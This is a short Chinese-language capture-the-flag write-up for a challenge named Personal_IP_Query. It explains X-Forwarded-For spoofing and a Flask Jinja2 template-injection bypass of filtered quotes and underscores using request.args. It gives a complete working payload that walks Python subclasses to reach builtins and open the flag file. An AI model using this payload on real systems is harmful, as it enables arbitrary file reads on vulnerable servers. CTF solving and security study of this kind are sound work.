# Personal_IP_Query 题目

## 考察知识点
- XFF IP 伪造
- Flask jinja2 SSTI
  
## 解题思路  
- 过滤了 " ' _
- 使用 flask 的 request.args 绕过
- payload
  - get数据
    - `http://127.0.0.1:5000/?class=__class__&base=__base__&subclasses=__subclasses__&builtins=__builtins__&globals=__globals__&init=__init__&catchwarnings=catch_warnings&name=__name__&filename=flag&readmodel=r`
  - XFF头中数据
    - `{% for c in [][request.args.class][request.args.base]request.args.subclasses %}{% if c[request.args.name]==request.args.catchwarnings %}{{ c[request.args.init][request.args.globals][request.args.builtins].open(request.args.filename, request.args.readmodel).read() }}{% endif %}{% endfor %}`